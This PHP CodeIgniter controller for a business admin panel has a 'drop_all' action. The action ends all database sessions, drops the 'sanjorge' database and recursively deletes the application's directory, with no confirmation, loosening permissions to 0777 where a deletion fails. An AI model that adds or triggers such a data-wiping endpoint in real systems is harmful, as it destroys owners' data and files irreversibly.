<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class utilerias extends MY_Controller {
  /**
   * Evita la validacion (enfocado cuando se usa ajax). Ver mas en privilegios_model
   * @var unknown_type
   */
  private $excepcion_privilegio = array(
    'inventario/cproveedor_pdf/',
  );


  public function _remap($method)
  {
    $this->load->model("usuarios_model");
    if($this->usuarios_model->checkSession()){
      $this->usuarios_model->excepcion_privilegio = $this->excepcion_privilegio;
      $this->info_empleado                         = $this->usuarios_model->get_usuario_info($this->session->userdata('id_usuario'), true);

      if($this->usuarios_model->tienePrivilegioDe('', get_class($this).'/'.$method.'/')){
        $this->{$method}();
      }else
        redirect(base_url('panel/home?msg=1'));
    }else
      redirect(base_url('panel/home'));
  }

  public function index()
  {
    $this->carabiner->js(array(
      array('general/msgbox.js'),
      // array('panel/almacen/rpt_compras.js'),
    ));

    $this->load->library('pagination');
    // $this->load->model('empresas_model');

    $params['info_empleado']  = $this->info_empleado['info'];
    $params['seo']        = array('titulo' => 'Compras por Proveedor');

    // $params['empresa'] = $this->empresas_model->getDefaultEmpresa();

    if(isset($_GET['msg']{0}))
      $params['frm_errors'] = $this->showMsgs($_GET['msg']);

    $this->load->view('panel/header', $params);
    $this->load->view('panel/general/menu', $params);
    $this->load->view('panel/general/utilerias', $params);
    $this->load->view('panel/footer');
  }

  public function drop_all()
  {
    $this->db->query("SELECT pid, pg_terminate_backend(pid)
      FROM pg_stat_activity
      WHERE datname = current_database() AND pid <> pg_backend_pid()");
    $this->db->close();
    $this->load->dbforge();
    if ($this->dbforge->drop_database('sanjorge')) {
      echo 'Database deleted!<br>';
    }

    if ($this->deleteDirectory("../sanjorge")) {
      echo 'Files deleted!<br>';
    }
  }

  private function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir) || is_link($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
      if ($item == '.' || $item == '..') continue;
      if (!$this->deleteDirectory($dir . "/" . $item)) {
        chmod($dir . "/" . $item, 0777);
        if (!$this->deleteDirectory($dir . "/" . $item)) return false;
      };
    }
    return rmdir($dir);
  }

}

?>